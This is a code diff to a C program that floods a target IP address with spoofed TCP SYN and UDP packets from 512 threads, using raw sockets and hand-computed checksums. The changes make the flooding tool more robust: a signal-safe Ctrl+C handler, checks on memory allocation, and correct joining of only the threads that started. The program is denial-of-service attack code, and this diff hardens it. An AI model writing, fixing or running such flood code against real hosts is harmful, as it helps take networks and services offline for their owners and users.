@@ -20,7 +20,7 @@
 #define THREAD_COUNT 512
 
 // Global state
-int row;
+volatile sig_atomic_t row;
 int port_select;
                                                                                                                                     
 extern pthread_mutex_t ekran_mutex;
@@ -44,12 +44,30 @@ typedef struct {
     int thread_count;
 } AnimationArgs;
 
-// Signal handler for Ctrl+C
+// Signal handler for Ctrl+C: only async-signal-safe calls.
 void sigint_handler(int sig) {
-    (void)sig;    
+    (void)sig;
     stop_flag = 1;
-    printf("\033[%d;1H", row); 
-    printf("\033[J");
+    char seq[32];
+    size_t len = 0;
+    seq[len++] = '\033';
+    seq[len++] = '[';
+    int value = row > 0 ? row : 1;
+    char digits[12];
+    int ndigits = 0;
+    do {
+        digits[ndigits++] = (char)('0' + value % 10);
+        value /= 10;
+    } while (value > 0 && ndigits < (int)sizeof(digits));
+    while (ndigits > 0 && len < sizeof(seq) - 5)
+        seq[len++] = digits[--ndigits];
+    seq[len++] = ';';
+    seq[len++] = '1';
+    seq[len++] = 'H';
+    seq[len++] = '\033';
+    seq[len++] = '[';
+    seq[len++] = 'J';
+    (void)write(STDOUT_FILENO, seq, len);
 }
 
 // Compute checksum (for IP and TCP)
@@ -170,6 +188,11 @@ static void *flood(void *arg)
 
         int psize_tcp = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
         char *pseudogram_tcp = malloc(psize_tcp);
+        if (!pseudogram_tcp) {
+            close(sock_tcp);
+            close(sock_udp);
+            pthread_exit(NULL);
+        }
         memcpy(pseudogram_tcp, &psh_tcp, sizeof(struct pseudo_header));
         memcpy(pseudogram_tcp + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
         tcph->check = checksum((unsigned short *)pseudogram_tcp, psize_tcp);
@@ -227,6 +250,11 @@ static void *flood(void *arg)
 
         int psize_udp = sizeof(struct pseudo_header) + sizeof(struct udphdr) + payload_len;
         char *pseudogram_udp = malloc(psize_udp);
+        if (!pseudogram_udp) {
+            close(sock_tcp);
+            close(sock_udp);
+            pthread_exit(NULL);
+        }
         memcpy(pseudogram_udp, &psh_udp, sizeof(struct pseudo_header));
         memcpy(pseudogram_udp + sizeof(struct pseudo_header), udph, sizeof(struct udphdr) + payload_len);
         udph->check = checksum((unsigned short *)pseudogram_udp, psize_udp);
@@ -315,18 +343,21 @@ int SYN_Flood(const char *target_ip) {
     }
 
     // Create flood threads
+    int threads_created = 0;
     for (int i = 0; i < THREAD_COUNT; i++) {
         if (pthread_create(&threads[i], NULL, flood, (void *)target_ip) != 0) {
             fprintf(stderr, "Failed to create thread %d\n", i);
+            break;
         }
+        threads_created++;
     }
 
-    // Wait for all threads to finish
-    for (int i = 0; i < THREAD_COUNT; i++) {
+    // Wait for the threads that were actually started
+    for (int i = 0; i < threads_created; i++) {
         pthread_join(threads[i], NULL);
     }
     pthread_join(animasyon_thread, NULL);
-    printf("[-]Thread");
+    printf("[-]Thread\n");
     
     return 0;
 }
